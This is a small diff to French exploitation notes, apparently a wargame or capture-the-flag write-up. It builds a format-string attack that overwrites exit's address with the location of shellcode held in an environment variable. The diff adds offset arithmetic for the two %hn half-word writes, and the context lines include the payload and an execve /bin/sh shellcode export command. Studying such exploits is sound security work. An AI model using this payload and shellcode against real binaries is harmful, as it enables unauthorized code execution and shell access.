@@ -9,6 +9,9 @@ gdb x/1w 0x080497e0
 "\xe0\x97\x04\x08" -> adresse de exit
 "%55570d%11$hn" + "%9957d%10$hn" -> adresse de notre shellcode dans l'environnement qui sera ecrit 2 bit par 2 bit 
 
+ffff -> 65535 - 55578 -> 9957
+d91a -> 55578 - 8 -> 55570
+
 pour avoir l'adresse du shellcode dans l'environnement
 export SHELLCODE=$(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 
